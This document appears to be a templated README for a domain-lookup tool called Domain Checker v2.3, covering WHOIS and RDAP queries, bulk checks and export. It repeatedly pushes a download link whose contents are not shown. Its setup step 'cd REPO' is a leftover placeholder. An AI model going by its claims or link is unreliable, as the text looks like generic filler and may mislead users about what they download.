# Domain Checker v2.3 - Domain Information Lookup Tool 2026

> **Domain Checker is a browser-based tool for gathering, inspecting, and exporting domain data through WHOIS, WHOIS XML, and RDAP. Version 2.3 supports both single-domain checks and bulk lookups.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/scottgabedvx187/domain-checker-query-hub?style=flat-square)](https://github.com/scottgabedvx187/domain-checker-query-hub)

---

<p align="center">
  <a href="https://scottgabedvx187.github.io/domain-checker-query-hub/">
    <img src="https://img.shields.io/badge/Download-Domain%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download Domain Checker">
  </a>
</p>

> **[Download Domain Checker v2.3](https://scottgabedvx187.github.io/domain-checker-query-hub/)**

---

[Download Latest Build](https://scottgabedvx187.github.io/domain-checker-query-hub/)

---

## What Domain Checker Does

Domain Checker provides a browser workspace for examining a single domain or working through a larger collection of domain names. It brings WHOIS, WHOIS XML, and RDAP lookups together with URL-based domain extraction, continuously updated results, searchable logs, and controls for managing requests.

Lookup output is displayed in sortable tables, saved in SQLite-backed history, and available for export to CSV or Excel. The application also includes multiple themes, HTTP proxy settings, pause and resume controls, retry operations, and web API and CLI access for different operating styles.

---

## Key Capabilities

- Check one domain or submit a bulk collection for processing.
- Retrieve information through WHOIS, WHOIS XML, or RDAP.
- Parse URLs to obtain domain names for lookup input.
- Follow live lookup progress through sortable tables and filtered logs.
- Stop and continue processing, retry failed requests, or retry them automatically.
- Set request rate limits and provide HTTP proxy configuration.
- Preserve lookup history in SQLite storage.
- Save results as CSV or Excel files.
- Select a light, dark, green, or purple interface theme.
- Automate lookups through the web API or command-line interface.

---

## Getting Started

First, clone the repository and enter the project directory:

    git clone https://github.com/scottgabedvx187/domain-checker-query-hub.git
    cd REPO

Because Domain Checker is a web application, its files must be served by a local or hosted web server. Once the server is running, open the application URL in your browser.

The hosted version is available here:

[Open Domain Checker](https://scottgabedvx187.github.io/domain-checker-query-hub/)

---

## How to Use

Follow these steps for a standard domain lookup:

1. Launch Domain Checker in a web browser.
2. Add a single domain or enter a list for bulk processing.
3. Parse URL input if the domains must first be collected from web addresses.
4. Choose WHOIS, WHOIS XML, RDAP, or another available lookup method.
5. Begin the query and observe the live result table and filtered log output.
6. Pause the operation and resume it later if needed.
7. Retry one failed domain or retry the complete group of failed entries.
8. Sort the returned data and export it to CSV or Excel.

For scripted or integrated workflows, use the web API or CLI provided by the deployed build when available.

---

## Settings and Storage

The application's configuration controls allow you to adjust operational behavior, including the HTTP proxy, request rate limits, retry handling, and interface theme.

SQLite is used for query history. Ensure the application can write to its storage location when previous searches need to remain available. For data that needs to be moved or analyzed elsewhere, use the built-in CSV or Excel export options.

---

## Requirements

- A current web browser.
- A local or hosted web server that can serve the project files.
- Network connectivity to the WHOIS, WHOIS XML, or RDAP services being queried.
- Writable storage for SQLite query history.
- Optional HTTP proxy information when requests must use a proxy.
- Extra storage according to the amount of saved history and exported data.

---

## Frequently Asked Questions

### Does Domain Checker support a single domain?

Yes. You can perform an individual lookup or submit multiple domains at once.

### Can domain names be taken from URLs?

Yes. URL parsing extracts domain names from URL input before the lookup begins.

### What protocols can be queried?

Domain Checker supports WHOIS, WHOIS XML, and RDAP.

### Is it possible to stop an active lookup?

Yes. A running query can be paused and resumed. Individual failures and bulk failures can also be retried.

### How is lookup history stored?

History is maintained in SQLite. The deployed application needs writable storage if searches are expected to persist.

### Which themes are included?

The available appearance choices are light, dark, green, and purple. They can be selected in the application settings.

### Can lookup data be exported?

Yes. Results can be written to CSV or Excel format.

### What can I do when a lookup does not succeed?

Check the domain input, verify connectivity to the selected lookup service, review the HTTP proxy configuration, and inspect rate-limit and retry settings. Running a retry for the affected domain or failed bulk entries may resolve temporary issues.

### How do I find newer versions?

Check the project repository and the latest build link for updated releases and project changes.

---

## Planned Improvements

- Further streamline bulk lookup operations.
- Refine result inspection and export workflows.
- Add to the configuration controls used by API, CLI, proxy, and retry workflows.
- Continue supporting the existing themes and SQLite-backed history experience.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
